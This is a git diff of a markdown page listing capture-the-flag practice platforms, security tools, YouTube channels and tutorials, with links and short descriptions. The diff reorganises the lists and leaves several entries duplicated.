@@ -5,291 +5,152 @@ date:   2024-08-08 12:32:45 +0100
 categories:
 ---
 
-- [Platforms](#platforms)
-- [Tools](#tools)
-- [Videos](#videos)
-- [More Resources](#more-resources)
-[Wikis](#wikis)
-[Privilige Escalation](#privilige-escalation)
-[Get interactive shell](#get-interactive-shell)
-
+[Platforms](#platforms)
+[Tools](#tools)
+[Videos](#videos)
+[Useful Codes](#useful-codes)
+[More Resources](#more-resources)
 
 # ------ Platforms ------
 {:#platforms}
 
 [CTFTime](https://ctftime.org)
 [OverTheWire](https://overthewire.org/wargames)
-[PicoCTF](https://play.picoctf.org)
+[PicoCTF](https://picoctf.org/)
 [ImaginaryCTF](https://imaginaryctf.org)
 [247CTF](https://247ctf.com)
 [CTF Challenge](https://ctfchallenge.com)
 [CTF Learn](https://ctflearn.com)
-[CryptoHack](https://cryptohack.org)
+[CryptoHack](https://cryptohack.org/) - [Writeups](https://github.com/Adamkadaban/CTFs/tree/master/2.Labs/CryptoHack)
 [HackThisSite](https://www.hackthissite.org)
-[SmashTheStack](http://smashthestack.org/wargames.html)
-[W3Challs](https://w3challs.com/challenges)
+[SmashTheStack](http://smashthestack.org/).
+[W3Challs](https://w3challs.com/)
 [Ringzer0CTF](https://ringzer0ctf.com/challenges)
 [Enigma Group](https://www.enigmagroup.org)
 [Root Me](https://www.root-me.org)
-
-- [CTFd](https://github.com/isislab/CTFd) - Platform to host jeopardy style CTFs from ISISLab, NYU Tandon.
-- [echoCTF.RED](https://github.com/echoCTF/echoCTF.RED) - Develop, deploy and maintain your own CTF infrastructure.
-- [FBCTF](https://github.com/facebook/fbctf) - Platform to host Capture the Flag competitions from Facebook.
-- [Haaukins](https://github.com/aau-network-security/haaukins)- A Highly Accessible and Automated Virtualization Platform for Security Education.
-- [HackTheArch](https://github.com/mcpa-stlouis/hack-the-arch) - CTF scoring platform.
-- [Mellivora](https://github.com/Nakiami/mellivora) - A CTF engine written in PHP.
-- [MotherFucking-CTF](https://github.com/andreafioraldi/motherfucking-ctf) - Badass lightweight plaform to host CTFs. No JS involved.
-- [NightShade](https://github.com/UnrealAkama/NightShade) - A simple security CTF framework.
-- [OpenCTF](https://github.com/easyctf/openctf) - CTF in a box. Minimal setup required.
-- [PicoCTF](https://github.com/picoCTF/picoCTF) - The platform used to run picoCTF. A great framework to host any CTF.
-- [PyChallFactory](https://github.com/pdautry/py_chall_factory) - Small framework to create/manage/package jeopardy CTF challenges.
-- [RootTheBox](https://github.com/moloch--/RootTheBox) - A Game of Hackers (CTF Scoreboard & Game Manager).
-- [Scorebot](https://github.com/legitbs/scorebot) - Platform for CTFs by Legitbs (Defcon).
-- [SecGen](https://github.com/cliffe/SecGen) - Security Scenario Generator. Creates randomly vulnerable virtual machines.
-
-- [PicoCTF](https://play.picoctf.org/practice)
-    - Tons of amazing practice challenges.
-    - Definitely the gold standard for getting started
-- [UCF](https://ctf.hackucf.org/challenges)
-    - Good overall, but great pwn practice
-    - I'm currently working on putting writeups [here](https://github.com/Adamkadaban/CTFs/tree/master/1.CTFs/HackUCF)
-- [hacker101](https://ctf.hacker101.com/ctf)
-    - CTF, but slightly more geared toward pentesting
-- [CSAW](https://365.csaw.io/)
-    - Down 90% the time and usually none of the connections work
-    - If it is up though, it has a lot of good introductory challenges
-- [CTF101](https://ctf101.org/)
-    - One of the best intros to CTFs I've seen (gj osiris)
-    - Very succinct and beginner-friendly
-- [HackTheBox](hackthebox.com)
-    - The OG box site
-        - Boxes are curated to ensure quality
-    - Now has some CTF-style problems
-    - Now has courses to start learning
-- [TryHackMe](https://tryhackme.com/hacktivities)
-    - Slightly easier boxes than HackTheBox
-    - Step-by-step challenges
-    - Now has "learning paths" to guide you through topics
-- [CybersecLabs](https://www.cyberseclabs.co.uk/)
-    - Great collection of boxes
-    - Has some CTF stuff
-- [VulnHub](https://www.vulnhub.com/)
-    - Has vulnerable virtual machines you have to deploy yourself
-    - Lots of variety, but hard to find good ones imo
-- [pwnable.kr](http://pwnable.kr/index.php)
-    - Challenges with good range of difficulty
-- [pwnable.tw](https://pwnable.tw/challenge/)
-    - Harder than pwnable.kr
-    - Has writeups once you solve the chall
-- [pwnable.xyz](https://pwnable.xyz/challenges/)
-    - More pwn challenges
-    - Has writeups once you solve the chall
-    - You can upload your own challenges once you solve all of them
-- [pwn dojo](https://dojo.pwn.college)
-    - Best collection of pwn challenges in my opinion
-    - Backed up with slides teaching how to do it & has a discord if you need help
-- [nightmare](https://guyinatuxedo.github.io/)
-    - Gold standard for pwning C binaries
-    - Has a few mistakes/typos, but amazing overall
-- [pwn notes](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)
-    - Notes from some random person online
-    - Very surface-level, but good intro to everything
-- [Security Summer School](https://security.cs.pub.ro/summer-school/wiki/start)
-    - University of Bucharest Security Course
-    - Very beginner-friendly explanations 
-- [RPISEC MBE](https://github.com/RPISEC/MBE)
-    - RPI's Modern Binary Exploitation Course
-    - Has a good amount of labs/projects for practice & some (slightly dated) lectures
-- [how2heap](https://github.com/shellphish/how2heap)
-    - Heap Exploitation series made by ASU's CTF team
-    - Includes a very cool debugger feature to show how the exploits work
-- [ROPEmporium](https://ropemporium.com/)
-    - Set of challenges in every major architecture teaching Return-Oriented-Programming
-    - Very high quality. Teaches the most basic to the most advanced techniques. 
-    - I'm currently adding my own writeups [here](https://github.com/Adamkadaban/CTFs/tree/master/2.Labs/ROPEmporium/)
-- [Phoenix Exploit Education](https://exploit.education/phoenix/)
-    - Tons of binary exploitation problems ordered by difficulty
-    - Includes source and comes with a VM that has all of the binaries.
-- [challenges.re](https://challenges.re/)
-    - So many challenges 0_0
-    - Tons of diversity
-- [reversing.kr](http://reversing.kr/)
-- [crackmes.one](https://crackmes.one)
-    - Tons of crackme (CTF) style challenges
-- [Malware Unicorn Workshops](https://malwareunicorn.org/#/workshops)
-	- Free workshops about Reverse engineering and Malware Analysis
-- [websec.fr](http://websec.fr/#)
-    - Lots of web challenges with a good range of difficulty
-- [webhacking.kr](https://webhacking.kr/chall.php)
-    - Has archive of lots of good web challenges
-- [Securing Web Applications](https://samsclass.info/129S/129S_S22.shtml)
-    - Open source CCSF Course
-- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
-    - Very much geared toward pentesting, but useful for exploring web in CTFs
-    - Over 100 vulns/challenges in total
-- [PortSwigger](https://portswigger.net/web-security/dashboard)
-    - Gold standard for understanding web hacking
-    - Tons of amazing challenges & explanations
-- [DVWA](https://dvwa.co.uk/)
-    - Very much geared toward pentesting, but useful for exploring web in CTFs
-- [bWAPP](http://www.itsecgames.com/)
-    - Very much geared toward pentesting, but useful for exploring web in CTFs
-- [CTF Challenge](https://ctfchallenge.com/register)
-    - Collection of web challenges made by Adam Langley that are made to be as realistic as possible.
-    - Good for getting bug bounty experience
-- [CryptoHack](https://cryptohack.org/)
-    - I'm currently working on putting writeups [here](https://github.com/Adamkadaban/CTFs/tree/master/2.Labs/CryptoHack)
-- [cryptopals](https://cryptopals.com/)
-    - The OG crypto challenge site.
-- [CryptoCTF](https://cr.yp.toc.tf)
-    - Annual cryptography CTF. Previous years accessible at `20{19,20,21,22,23,24}.cr.yp.toc.tf`.
-- [Capture the Ether](https://capturetheether.com/)
-- [CloudFoxable](https://cloudfoxable.bishopfox.com)
-    - Walks you through setting up a vulnerable environment to be exploited using [cloudfox](https://github.com/BishopFox/cloudfox)
-- [flaws.cloud](https://flaws.cloud)
-    - Free challenges that involve finding secrets in S3, EC2, and Lambda
-- [hacker101](https://www.hacker101.com/videos)
-- [hacksplaining](https://www.hacksplaining.com/lessons)
-- [Exploit developement](https://samsclass.info/127/127_S22.shtml)
-    - Open source CCSF Course
-- [Intro to Security](https://cseweb.ucsd.edu/~dstefan/cse127-fall21/)
-    - UC San Diego course taught by Deian Stefan
-    - Covers basic pwn and crypto 
-- [Active Directory Cheat Sheet](https://github.com/Tib3rius/Active-Directory-Exploitation-Cheat-Sheet)
-- [WADComs](https://wadcoms.github.io/)
-    - Interactive cheat sheet for Windows/AD environments
-- [LOLBAS](https://lolbas-project.github.io/)
-    - Interactive cheat sheet for **Windows** "Living off the land" binaries, scripts, and libraries for exploitation 
-- [GTFOBins](https://gtfobins.github.io/)
-    - Interactive cheat sheet for **Linux** "Living off the land" techniques.
-- [gtfobins](https://gtfobins.github.io/) to search for binaries that can be used to get root shell under certain conditions
-- [Backdoor](https://backdoor.sdslabs.co/) - Security Platform by SDSLabs.
-- [Crackmes](https://crackmes.one/) - Reverse Engineering Challenges.
-- [CryptoHack](https://cryptohack.org/) - Fun cryptography challenges.
-- [echoCTF.RED](https://echoctf.red/) - Online CTF with a variety of targets to attack.
-- [Exploit Exercises](https://exploit-exercises.lains.space/) - Variety of VMs to learn variety of computer security issues.
-- [Exploit.Education](http://exploit.education) - Variety of VMs to learn variety of computer security issues.
-- [Gracker](https://github.com/Samuirai/gracker) - Binary challenges having a slow learning curve, and write-ups for each level.
-- [Hack The Box](https://www.hackthebox.eu) - Weekly CTFs for all types of security enthusiasts.
-- [Hack This Site](https://www.hackthissite.org/) - Training ground for hackers.
-- [Hacker101](https://www.hacker101.com/) - CTF from HackerOne
-- [Hacking-Lab](https://hacking-lab.com/) - Ethical hacking, computer network and security challenge platform.
-- [Hone Your Ninja Skills](https://honeyourskills.ninja/) - Web challenges starting from basic ones.
-- [IO](http://io.netgarage.org/) - Wargame for binary challenges.
-- [Microcorruption](https://microcorruption.com) - Embedded security CTF.
-- [Over The Wire](http://overthewire.org/wargames/) - Wargame maintained by OvertheWire Community.
-- [PentesterLab](https://pentesterlab.com/) - Variety of VM and online challenges (paid).
-- [PicoCTF](https://2019game.picoctf.com) - All year round ctf game. Questions from the yearly picoCTF competition.
-- [PWN Challenge](http://pwn.eonew.cn/) - Binary Exploitation Wargame.
-- [Pwnable.kr](http://pwnable.kr/) - Pwn Game.
-- [Pwnable.tw](https://pwnable.tw/) - Binary wargame.
-- [Pwnable.xyz](https://pwnable.xyz/) - Binary Exploitation Wargame.
-- [Reversin.kr](http://reversing.kr/) - Reversing challenge.
-- [Ringzer0Team](https://ringzer0team.com/) - Ringzer0 Team Online CTF.
-- [Root-Me](https://www.root-me.org/) - Hacking and Information Security learning platform.
-- [ROP Wargames](https://github.com/xelenonz/game) - ROP Wargames.
-- [SANS HHC](https://holidayhackchallenge.com/past-challenges/) - Challenges with a holiday theme
+[UCF](https://ctf.hackucf.org/challenges) - [Writeups](https://github.com/Adamkadaban/CTFs/tree/master/1.CTFs/HackUCF)
+[Hacker101](https://www.hacker101.com/)
+[HackTheBox](https://www.hackthebox.com)
+[TryHackMe](https://tryhackme.com)
+[VulnHub](https://www.vulnhub.com/)
+[pwnable.kr](http://pwnable.kr/index.php)
+[pwnable.tw](https://pwnable.tw/challenge/)
+[pwnable.xyz](https://pwnable.xyz/challenges/)
+[pwn dojo](https://dojo.pwn.college)
+[Pwn.college](https://pwn.college/)
+[websec.fr](http://websec.fr/)
+[WebHacking](http://webhacking.kr)
+[PortSwigger](https://portswigger.net/web-security/dashboard)
+[Web Security Academy](https://portswigger.net/web-security)
+[burpsuite](https://portswigger.net/burp/communitydownload) to intercept http request packages
+[BurpSuite](https://portswigger.net/burp) - A graphical tool to testing website security.
+[Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack) - Burp Suite extension for sending large numbers of HTTP requests 
+[Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) - Burp Suite extension for sending large numbers of HTTP requests and analyzing the results.
+[BurpSuite](https://portswigger.net/burp) - A graphical tool to testing website security.
+[BurpSuite](https://portswigger.net/burp) - Intercepts web requests and allows you to modify them
+[Cryptopals](https://cryptopals.com/)
+[CryptoCTF](https://cr.yp.toc.tf) - Previous years accessible at `20{19,20,21,22,23,24}.cr.yp.toc.tf`.
+[Capture the Ether](https://capturetheether.com/)
+[CloudFoxable](https://cloudfoxable.bishopfox.com)
+  - Walks you through setting up a vulnerable environment to be exploited using [cloudfox](https://github.com/BishopFox/cloudfox)
+[hacksplaining](https://www.hacksplaining.com/lessons)
+[Ringzer0Team](https://ringzer0team.com/) - Ringzer0 Team Online CTF.
+[SANS HHC](https://holidayhackchallenge.com/past-challenges/) - Challenges with a holiday theme
   released annually and maintained by SANS.
-- [SmashTheStack](http://smashthestack.org/) - A variety of wargames maintained by the SmashTheStack Community.
-- [Viblo CTF](https://ctf.viblo.asia) - Various amazing CTF challenges, in many different categories. Has both Practice mode and Contest mode.
-- [VulnHub](https://www.vulnhub.com/) - VM-based for practical in digital security, computer application & network administration.
-- [W3Challs](https://w3challs.com) - A penetration testing training platform, which offers various computer challenges, in various categories.
-- [WebHacking](http://webhacking.kr) - Hacking challenges for web.
-
-*Self-hosted CTFs*
-- [Damn Vulnerable Web Application](http://www.dvwa.co.uk/) - PHP/MySQL web application that is damn vulnerable.
-- [Juice Shop CTF](https://github.com/bkimminich/juice-shop-ctf) - Scripts and tools for hosting a CTF on [OWASP Juice Shop](https://www.owasp.org/index.php/OWASP_Juice_Shop_Project) easily.
-
-*Frameworks that can be used to host a CTF*
-
-- [CTFd](https://github.com/CTFd/CTFd) - Platform to host jeopardy style CTFs.
-- [FBCTF](https://github.com/facebookarchive/fbctf) - Facebook CTF platform to host Jeopardy and "King of the Hill" CTF competitions.
-- [HackTheArch](https://github.com/mcpa-stlouis/hack-the-arch) - Scoring server for CTF competitions.
-- [kCTF](https://github.com/google/kctf) - Kubernetes-based infrastructure for CTF competitions.
-- [LibreCTF](https://github.com/easyctf/librectf) - CTF platform from EasyCTF.
-- [Mellivora](https://github.com/Nakiami/mellivora) - CTF engine written in PHP.
-- [NightShade](https://github.com/UnrealAkama/NightShade) - Simple CTF framework.
-- [picoCTF](https://github.com/picoCTF/picoCTF) - Infrastructure used to run picoCTF.
-- [rCTF](https://github.com/redpwn/rctf) - CTF platform maintained by the [redpwn](https://github.com/redpwn/rctf) CTF team.
-- [RootTheBox](https://github.com/moloch--/RootTheBox) - CTF scoring engine for wargames.
-- [ImaginaryCTF](https://github.com/Et3rnos/ImaginaryCTF) - Platform to host CTFs.
-
-- [0x0539](https://0x0539.net/) - Online CTF challenges.
-- [247CTF](https://247ctf.com/) - Free Capture The Flag Hacking Environment.
-- [Archive.ooo](https://archive.ooo/) - Live, playable archive of DEF CON CTF challenges.
-- [Atenea](https://atenea.ccn-cert.cni.es/) - Spanish CCN-CERT CTF platform.
-- [CTFlearn](https://ctflearn.com/) - Online platform built to help ethical hackers learn, practice, and compete.
-- [CTF365](https://ctf365.com/) - Security Training Platform.
-- [Crackmes.One](https://crackmes.one/) - Reverse Engineering Challenges.
-- [CryptoHack](https://cryptohack.org/) - Cryptography Challenges.
-- [Cryptopals](https://cryptopals.com/) - Cryptography Challenges.
-- [Defend the Web](https://defendtheweb.net/?hackthis) - An Interactive Cyber Security Platform.
-- [Dreamhack.io](https://dreamhack.io/wargame) - Online wargame.
-- [echoCTF.RED](https://echoctf.red/) - Online Hacking Laboratories.
-- [Flagyard](https://flagyard.com/) - An Online Playground of Hands-on Cybersecurity Challenges.
-- [HackBBS](https://hackbbs.org/index.php) - Online wargame.
-- [Hacker101](https://www.hacker101.com/) - CTF Platform by [HackerOne](https://www.hackerone.com/).
-- [Hackropole](https://hackropole.fr/en/) - This platform allows you to replay the challenges of the France Cybersecurity Challenge.
-- [HackTheBox](https://www.hackthebox.com/) - A Massive Hacking Playground.
-- [HackThisSite](https://www.hackthissite.org/) - Free, safe and legal training ground for hackers.
-- [HBH](https://hbh.sh/home) - Community designed to teach methods and tactics used by malicious hackers to access systems and sensitive information.
-- [Komodo](http://ctf.komodosec.com/) - This is a game designed to challenge your application hacking skills.
-- [MicroCorruption](https://microcorruption.com/) - Embedded Security CTF.
-- [MNCTF](https://mnctf.info/) - Online cybersecurity challenges.
-- [OverTheWire](https://overthewire.org/wargames/) - Wargame offered by the OverTheWire community.
-- [picoCTF](https://picoctf.org/) - Beginner-friendly CTF platform.
-- [Pwn.college](https://pwn.college/) - Education platform to learn about, and practice, core cybersecurity concepts.
-- [PWN.TN](https://pwn.tn/) - Educational and non commercial wargame.
-- [Pwnable.kr](http://pwnable.kr/) - Pwn/Exploiting platform.
-- [Pwnable.tw](https://pwnable.tw/) - Pwn/Exploiting platform.
-- [Pwnable.xyz](https://pwnable.xyz/) - Pwn/Exploiting platform.
-- [PWNChallenge](http://pwn.eonew.cn/) - Pwn/Exploiting platform.
-- [Reversing.kr](http://reversing.kr/) - Reverse Engineering platform.
-- [Root-me](https://www.root-me.org/) - CTF training platform.
-- [VibloCTF](https://ctf.viblo.asia/landing) - CTF training platform.
-- [VulnHub](https://www.vulnhub.com/) - VM-based pentesting platform.
-- [W3Challs](https://w3challs.com/) - Hacking/CTF platform.
-- [WebHacking](https://webhacking.kr/) - Web challenges platform.
-- [Websec.fr](http://websec.fr/) - Web challenges platform.
-- [WeChall](https://www.wechall.net/active_sites) - Challenge sites directory & forum.
-- [YEHD 2015](https://2015-yehd-ctf.meiji-ncc.tech/) - YEHD CTF 2015 online challenges.
-
-*Self-hosted CTFs*
-
-- [AWSGoat](https://github.com/ine-labs/AWSGoat) - A Damn Vulnerable AWS Infrastructure.
-- [CICD-goat](https://github.com/cider-security-research/cicd-goat) - A deliberately vulnerable CI/CD environment. Learn CI/CD security through multiple challenges.
-- [Damn Vulnerable Web Application](https://dvwa.co.uk/) - PHP/MySQL web application that is damn vulnerable.
-- [GCPGoat](https://github.com/ine-labs/GCPGoat) - A Damn Vulnerable GCP Infrastructure.
-- [Juice Shop](https://github.com/juice-shop/juice-shop-ctf) - Capture-the-Flag (CTF) environment setup tools for OWASP Juice Shop. 
+[Viblo CTF](https://ctf.viblo.asia) - Various amazing CTF challenges, in many different categories. Has both Practice mode and Contest mode.
+[0x0539](https://0x0539.net/) - Online CTF challenges.
+[Archive.ooo](https://archive.ooo/) - Live, playable archive of DEF CON CTF challenges.
+[Atenea](https://atenea.ccn-cert.cni.es/) - Spanish CCN-CERT CTF platform.
+[CTF365](https://ctf365.com/) - Security Training Platform.
+[Defend the Web](https://defendtheweb.net/?hackthis) - An Interactive Cyber Security Platform.
+[Dreamhack.io](https://dreamhack.io/wargame) - Online wargame.
+[echoCTF.RED](https://echoctf.red/)
+[Flagyard](https://flagyard.com/) - An Online Playground of Hands-on Cybersecurity Challenges.
+[HackBBS](https://hackbbs.org/index.php) - Online wargame.
+[Hackropole](https://hackropole.fr/en/) - This platform allows you to replay the challenges of the France Cybersecurity Challenge.
+[HBH](https://hbh.sh/home) - Community designed to teach methods and tactics used by malicious hackers to access systems and sensitive information.
+[Komodo](http://ctf.komodosec.com/) - This is a game designed to challenge your application hacking skills.
+[MicroCorruption](https://microcorruption.com/) - Embedded Security CTF.
+[MNCTF](https://mnctf.info/) - Online cybersecurity challenges.
+[PWN.TN](https://pwn.tn/) - Educational and non commercial wargame.
+[WeChall](https://www.wechall.net/active_sites) - Challenge sites directory & forum.
+[YEHD 2015](https://2015-yehd-ctf.meiji-ncc.tech/) - YEHD CTF 2015 online challenges.
+[IO](http://io.netgarage.org/) - Wargame for binary challenges.
+[Hacking-Lab](https://hacking-lab.com/) - Ethical hacking, computer network and security challenge platform.
+[OffSec Proving Grounds](https://www.offensive-security.com/labs)
+[HackXOR](https://hackxor.net)
+[Hacktoria](https://hacktoria.com)
 
 # ------ Tools ------
 {:#tools}
 
-[HackTheBox](https://app.hackthebox.eu)
-[TryHackMe](https://tryhackme.com)
-[OffSec Proving Grounds](https://www.offensive-security.com/labs)
-[Web Security Academy](https://portswigger.net/web-security)
-[Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
-[OWASP Juice Shop](https://github.com/juice-shop/juice-shop-ctf)
-[Hacker 101](https://ctf.hacker101.com)
-[PentesterLab](https://pentesterlab.com)
-[VulnHub](https://www.vulnhub.com)
-[VulnMachines](https://www.vulnmachines.com)
-[HackingLab](https://www.hacking-lab.com/index.html)
-[CyberSecLabs](https://www.cyberseclabs.co.uk)
-[HackXOR](https://hackxor.net)
-[Hacktoria](https://hacktoria.com)
+[Ghidra](https://ghidra.re/CheatSheet.html)
+[Volatility](https://github.com/volatilityfoundation/volatility/wiki/Linux)
+[PwnTools](https://github.com/Gallopsled/pwntools-tutorial)
+[CyberChef](https://gchq.github.io/CyberChef)
+[DCode](https://www.dcode.fr/en)
+[Run Code](https://tio.run)
+[GTFOBins](https://gtfobins.github.io)
+[ExploitDB](https://www.exploit-db.com)
+[Wireshark](https://www.wireshark.org/)
+[XORTool](https://github.com/hellman/xortool) - A tool to analyze multi-byte xor cipher.
+[XSSer](https://xsser.03c8.net/) - Automated XSS testor.
+[dirsearch](https://github.com/maurosoria/dirsearch) - Web path scanner.
+[Commix](https://github.com/commixproject/commix) - Automated All-in-One OS Command Injection and Exploitation Tool.
+[Postman](https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop?hl=en) - Add on for chrome for debugging network requests.
+[W3af](https://github.com/andresriancho/w3af) -  Web Application Attack and Audit Framework.
+[ngrok](https://ngrok.com/) - Secure introspectable tunnels to localhost.
+[WPScan](http://wpscan.com)
+[SQLMap](https://github.com/sqlmapproject/sqlmap)
+[Nikto](https://tools.kali.org/information-gathering/nikto)
+[gobuster](https://tools.kali.org/web-applications/gobuster)
+[hydra](https://tools.kali.org/password-attacks/hydra)
+[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+[Dirhunt](https://github.com/Nekmo/dirhunt) - Find web directories without bruteforce.
+[ffuf](https://github.com/ffuf/ffuf) - Fast web fuzzer written in Go.
+[hashcat](https://github.com/hashcat/hashcat) to attack hash
+[John the Ripper](https://github.com/openwall/john) jumbo to crack password
+[Ophcrack](https://ophcrack.sourceforge.io/) - Free Windows password cracker based on rainbow tables.
+[saucenao](https://saucenao.com/) to search for image source
+[aperisolve.com](https://www.aperisolve.com/) do stego for image online
+[29a.ch](https://29a.ch/photo-forensics/) do stego for image online
+[autopsy](https://github.com/sleuthkit/autopsy) a GUI tool for forensics
+[binwalk](https://github.com/ReFirmLabs/binwalk)
+[foremost](https://github.com/korczis/foremost)
+[QuipQuip](https://quipqiup.com) - An online tool for breaking substitution ciphers or vigenere ciphers (without key).
+[shodan.io](http://shodan.io) - find open ports and services online
+[GeoSpy AI](https://geospy.ai)
+[XSStrike] https://github.com/UltimateHackers/XSStrike
+[LC4] https://www.schneier.com/blog/archives/2018/05/lc4_another_pen.html
+[LC4] This is an adaptation of RC4... just not. There is an implementation available in Python. [https://github.com/dstein64/LC4/blob/master/documentation.md](https://github.com/dstein64/LC4/blob/master/documentation.md)
 
 # ------ Videos ------
 {:#videos}
 
 [LiveOverflow](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
+[Live Overflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)
+  - Makes extremely interesting and in-depth videos about cyber.
+  - Has an [amazing pwn series](https://www.youtube.com/watch?v=iyAyN3GFM7A&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&ab_channel=LiveOverflow)
+[LiveOverFlow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w) - Video tutorials on Exploitation.
 [John Hammond](https://www.youtube.com/c/JohnHammond010)
+[John Hammond](https://www.youtube.com/user/RootOfTheNull)
+  - Used to make a lot of CTF videos, but has moved on to other things
+  - Still a ton of useful videos. The CTF ones especially are amazing for teaching people brand new to cyber.
 [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
+[IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
+  - Makes writeups of every single HackTheBox 
+    machine
+  - Talks about diff ways to solve and why things work. Highly 
+[IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) - Video tutorials and walkthroughs of popular CTF platforms.
 [XCT](https://www.youtube.com/channel/UClGm2C8Qi0_Wv68zfjCz2YA)
 [Gynvael](https://www.youtube.com/user/GynvaelEN)
+[Gynvael](https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg)
+  - Makes amazingly intuitive video writeups. Has done the entirety of picoCTF 2019 (that's a lot)
 [ZetaTwo](https://www.youtube.com/c/ZetaTwo)
 [PwnFunction](https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A)
+[PwnFunction](https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A)
+  - Very high-quality and easy-to-understand animated videos about diff topics
+  - Topics are a bit advanced, but easily understandable
 [0xdf](https://www.youtube.com/channel/UChO9OAH57Flz35RRX__E25A)
 [247CTF](https://www.youtube.com/channel/UCtGLeKomT06x3xZ2SZp2l9Q)
 [MalFind](https://www.youtube.com/channel/UCJf4-reOhoiAlScWC1WzLgQ)
@@ -309,55 +170,36 @@ categories:
 [HackSplained](https://www.youtube.com/c/Hacksplained)
 [TheCyberMentor](https://www.youtube.com/c/TheCyberMentor)
 [StackSmashing](https://www.youtube.com/c/stacksmashing)
+[stacksmashing](https://www.youtube.com/c/stacksmashing/videos)
+  - Amazing reverse engineering & hardware hacking videos
+  - Has a really cool series of him reverse engineering WannaCry
 [Cybersecurity Meg](https://www.youtube.com/c/CybersecurityMeg)
 [Tib3rius](https://www.youtube.com/c/Tib3rius)
 [SecAura](https://www.youtube.com/channel/UCx89Lz24SEPZpExl6OfQ0Gg)
 [DarkSec](https://www.youtube.com/c/DarkSec)
 [Hexorcist](https://www.youtube.com/c/HEXORCIST)
 [PwnCollege](https://www.youtube.com/c/pwncollege)
+[pwn.college](https://www.youtube.com/channel/UCkRe0pvrQvhkhFSciV0l2MQ)
+  - ASU professor that has tons of videos on pwn
+  - Guided course material: [https://pwn.college/](https://pwn.college/)
+  - Tons of practice problems: [https://dojo.pwn.college/](https://dojo.pwn.college/)
 [NahamSec](https://www.youtube.com/c/Nahamsec)
 [Optional](https://www.youtube.com/c/optionalctf)
 [TheHackerish](https://www.youtube.com/c/thehackerish)
 [Ryan Gordon](https://www.youtube.com/c/0xRy4n)
 [AlmondForce](https://www.youtube.com/c/AlmondForce)
 [VulnMachines](https://www.youtube.com/c/vulnmachines)
-[Others](https://securitycreators.video)
-
---- ## YouTube Channels
-{:#youtube-we-love-video-resources}
-- [John Hammond](https://www.youtube.com/user/RootOfTheNull)
-    - Used to make a lot of CTF videos, but has moved on to other things
-    - Still a ton of useful videos. The CTF ones especially are amazing for teaching people brand new to cyber.
-- [Live Overflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)
-    - Makes extremely interesting and in-depth videos about cyber.
-    - Has an [amazing pwn series](https://www.youtube.com/watch?v=iyAyN3GFM7A&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&ab_channel=LiveOverflow)
-- [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
-    - Makes writeups of every single HackTheBox 
-    machine
-        - Talks about diff ways to solve and why things work. Highly recommend
 - [Computerphile](https://www.youtube.com/user/Computerphile)
     - Same people as Numberphile, but cooler. Makes really beginner-level and intuitive videos about basic concepts.
-- [pwn.college](https://www.youtube.com/channel/UCkRe0pvrQvhkhFSciV0l2MQ)
-    - ASU professor that has tons of videos on pwn
-    - Guided course material: [https://pwn.college/](https://pwn.college/)
-    - Tons of practice problems: [https://dojo.pwn.college/](https://dojo.pwn.college/)
-- [PwnFunction](https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A)
-    - Very high-quality and easy-to-understand animated videos about diff topics
-    - Topics are a bit advanced, but easily understandable
 - [Martin Carlisle](https://www.youtube.com/user/carlislemc/featured)
     - Makes amazing writeup videos about the picoCTF challenges.
 - [Sam Bowne](https://www.youtube.com/channel/UCC2OBhIt1sHE4odV05RYP1w)
     - CCSF professor that open sources all of his lectures and course material on [his website](https://samsclass.info/)
 - [UFSIT](https://www.youtube.com/channel/UCkRe0pvrQvhkhFSciV0l2MQ)
     - UF Cyber team (I'm a bit biased, but def one of the better YouTube channels for this)
-- [Gynvael](https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg)
-    - Makes amazingly intuitive video writeups. Has done the entirety of picoCTF 2019 (that's a lot)
 - [Black Hills Information Security](https://www.youtube.com/@BlackHillsInformationSecurity)
     - Security firm that makes a ton of educational content
     - Always doing free [courses](https://www.antisyphontraining.com/pay-what-you-can/) and [webcasts](https://discord.gg/BHIS) about security topics
-- [stacksmashing](https://www.youtube.com/c/stacksmashing/videos)
-    - Amazing reverse engineering & hardware hacking videos
-    - Has a really cool series of him reverse engineering WannaCry
 - [Ben Greenberg](https://www.youtube.com/channel/UCsNzKjRToTA2G0lR8FiduWQ)
     - GMU prof with a bunch of pwn and malware video tutorials
     - A bit out-of-date, but still good
@@ -370,34 +212,7 @@ categories:
 - [Matt Brown](https://www.youtube.com/@mattbrwn)
     - Embedded Security Pentester
     - Makes great beginner-friendly videos about IoT hacking
-
-
---- ## Tutorials
-
-*Tutorials to learn how to play CTFs*
-
-- [CTF Field Guide](https://trailofbits.github.io/ctf/) - Field Guide by Trails of Bits.
-- [CTF Resources](http://ctfs.github.io/resources/) -  Start Guide maintained by community.
-- [How to Get Started in CTF](https://www.endgame.com/blog/how-get-started-ctf) - Short guideline for CTF beginners by Endgame
-- [Intro. to CTF Course](https://www.hoppersroppers.org/courseCTF.html) - A free course that teaches beginners the basics of forensics, crypto, and web-ex.
-- [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) - Video tutorials and walkthroughs of popular CTF platforms.
-- [LiveOverFlow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w) - Video tutorials on Exploitation.
